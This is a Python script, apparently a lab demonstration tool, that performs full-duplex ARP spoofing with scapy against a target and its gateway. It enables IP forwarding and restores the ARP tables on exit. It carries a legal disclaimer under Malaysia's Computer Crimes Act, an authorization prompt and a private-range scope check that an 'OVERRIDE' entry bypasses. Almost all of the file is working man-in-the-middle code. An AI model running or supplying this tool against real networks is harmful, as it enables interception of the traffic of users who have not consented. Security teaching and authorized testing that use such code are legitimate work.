#!/usr/bin/env python3
"""
ARP Spoofing Demonstration Tool - Lab Use Only
Requires explicit authorization. See README for Rules of Engagement.
"""
import sys
import os
import time
import signal
from datetime import datetime

try:
    from scapy.all import ARP, Ether, sendp, getmacbyip, conf
except ImportError:
    print("[!] Scapy not installed. Run: pip install -r requirements.txt")
    sys.exit(1)

# ============ Legal Disclaimer (Computer Crimes Act 1997) ============
LEGAL_TEXT = """
================================================================================
LEGAL DISCLAIMER - COMPUTER CRIMES ACT 1997 (MALAYSIA)
================================================================================
This tool performs ARP spoofing, which intercepts network traffic.
Under the Computer Crimes Act 1997, unauthorized access to computer
systems or interception of data is a criminal offence (Sections 3, 4, 5).

You MUST have explicit written authorization from the network owner
and all affected users before running this tool.

By typing 'I HAVE AUTHORIZATION' below, you confirm that:
  1. You are operating in an isolated lab environment.
  2. You have permission to test the target (Windows 10 VM).
  3. You understand that misuse may result in criminal prosecution.
================================================================================
"""

def require_authorization():
    print(LEGAL_TEXT)
    answer = input("Type 'I HAVE AUTHORIZATION' to continue: ").strip()
    if answer != "I HAVE AUTHORIZATION":
        print("[!] Authorization not confirmed. Exiting.")
        sys.exit(1)

# ============ Scope Enforcement ============
def prompt_scope():
    print("\n--- Target Scope Configuration ---")
    target_ip = input("Target IP (default 127.0.0.1): ").strip() or "127.0.0.1"
    gateway_ip = input("Gateway IP (default 127.0.0.1): ").strip() or "127.0.0.1"
    iface = input("Interface (default eth0): ").strip() or "eth0"

    # Safe default: refuse public IPs without explicit override
    if not (target_ip.startswith("192.168.") or target_ip.startswith("10.") or
            target_ip.startswith("172.") or target_ip == "127.0.0.1"):
        print(f"[!] Target {target_ip} is outside private ranges.")
        override = input("Type 'OVERRIDE' to proceed anyway (NOT recommended): ").strip()
        if override != "OVERRIDE":
            sys.exit(1)

    print(f"[*] Scope locked: target={target_ip}, gateway={gateway_ip}, iface={iface}")
    return target_ip, gateway_ip, iface

# ============ ARP Spoofing Core ============
def get_mac(ip):
    mac = getmacbyip(ip)
    if mac is None:
        print(f"[!] Could not resolve MAC for {ip}. Is the host reachable?")
        sys.exit(1)
    return mac

def spoof(target_ip, target_mac, spoof_ip, iface):
    """Send one forged ARP reply: tell target that spoof_ip is at our MAC."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Wrap in Ether to silence scapy warning and ensure delivery
    frame = Ether(dst=target_mac) / pkt
    sendp(frame, iface=iface, verbose=False)

def restore(target_ip, target_mac, real_ip, real_mac, iface):
    """Restore the target's ARP table with correct mapping."""
    pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac,
              psrc=real_ip, hwsrc=real_mac)
    frame = Ether(dst=target_mac) / pkt
    sendp(frame, iface=iface, count=5, verbose=False)

# ============ Output Directory ============
OUTPUT_DIR = "output"

def ensure_output_dir():
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    return OUTPUT_DIR

def log_event(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(os.path.join(OUTPUT_DIR, "session.log"), "a") as f:
        f.write(line + "\n")

# ============ Main ============
def main():
    require_authorization()
    target_ip, gateway_ip, iface = prompt_scope()
    ensure_output_dir()

    # Resolve MACs
    log_event(f"Resolving MAC for target {target_ip} ...")
    target_mac = get_mac(target_ip)
    log_event(f"Resolving MAC for gateway {gateway_ip} ...")
    gateway_mac = get_mac(gateway_ip)

    log_event(f"Target MAC: {target_mac}, Gateway MAC: {gateway_mac}")

    # Enable IP forwarding (Linux only)
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    log_event("IP forwarding enabled.")

    log_event("Starting ARP spoofing. Press Ctrl+C to stop and restore.")
    try:
        while True:
            # Poison target: tell it we are the gateway
            spoof(target_ip, target_mac, gateway_ip, iface)
            # Poison gateway: tell it we are the target (full-duplex)
            spoof(gateway_ip, gateway_mac, target_ip, iface)
            time.sleep(2)
    except KeyboardInterrupt:
        log_event("Kill switch activated (Ctrl+C).")
    finally:
        # Restore ARP tables
        log_event("Restoring ARP tables ...")
        restore(target_ip, target_mac, gateway_ip, gateway_mac, iface)
        restore(gateway_ip, gateway_mac, target_ip, target_mac, iface)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        log_event("IP forwarding disabled. Clean exit.")
        log_event(f"Logs saved to ./{OUTPUT_DIR}/")

if __name__ == "__main__":
    main()
